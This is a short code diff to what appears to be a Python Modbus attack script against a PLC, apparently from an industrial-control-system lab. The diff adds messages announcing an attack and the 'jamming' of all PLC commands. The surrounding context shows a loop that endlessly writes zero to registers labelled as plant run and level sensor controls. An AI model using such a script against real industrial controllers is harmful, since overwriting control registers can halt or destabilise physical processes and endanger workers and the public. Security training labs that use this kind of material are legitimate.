@@ -7,6 +7,7 @@ import logging
 import argparse
 import os
 import sys
+import time
 
 # Override Argument parser to throw error and generate help message
 # if undefined args are passed
@@ -46,6 +47,10 @@ client = ModbusClient(args.target, port=5020)
 
 try:
     client.connect()
+    print "Connecting to PLC . . . Please wait "
+    time.sleep(3)
+    print ". . . Attacking PLC at " + args.target
+    print ". . . Jamming all PLC commands!"
     while True:
         rq = client.write_register(0x01, 0) # Run Plant, Run!
         rq = client.write_register(0x02, 0) # Level Sensor
